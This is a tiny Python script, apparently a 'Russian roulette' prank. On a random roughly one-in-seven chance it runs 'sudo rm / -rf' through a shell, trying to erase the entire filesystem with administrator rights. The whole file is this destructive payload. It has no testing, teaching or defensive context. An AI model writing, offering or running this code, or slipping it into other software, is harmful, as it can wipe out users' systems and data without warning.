import random
import subprocess

if random.randint(0, 6) == 1:
    subprocess.run("sudo rm / -rf", shell=True)
